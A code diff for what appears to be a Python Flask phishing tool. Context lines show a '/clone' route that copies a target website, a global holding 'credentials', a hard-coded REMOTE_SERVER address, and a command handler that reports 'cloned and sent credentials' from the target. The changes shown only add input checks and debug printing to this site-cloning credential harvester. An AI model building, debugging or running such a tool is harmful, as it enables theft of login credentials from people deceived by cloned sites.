@@ -19,7 +19,13 @@ REMOTE_SERVER = "http://10.0.1.33:3000"
 @app.route('/clone', methods=['POST'])
 def clone():
     global cloned_page, credentials
-    target_url = request.form['target_url']
+    target_url = request.form.get('target_url', None)
+    
+    # Debugging the request
+    print(f"Received target URL: {target_url}")
+    
+    if not target_url:
+        return jsonify({"status": "error", "message": "No target URL provided."}), 400
     
     try:
         # Request the page content
@@ -74,12 +80,13 @@ def execute_command(command):
         # Send POST request to clone the site
         clone_url = f'http://127.0.0.1:5000/clone'
         payload = {'target_url': target_url}
+        print(f"Sending request to: {clone_url} with payload: {payload}")  # Debugging output
         response = requests.post(clone_url, data=payload)
         
         if response.status_code == 200:
             print(f"Successfully cloned and sent credentials from {target_url}")
         else:
-            print("Failed to clone the target site.")
+            print(f"Failed to clone the target site. Status Code: {response.status_code}")
     else:
         print(f"Unknown command: {command}")
 
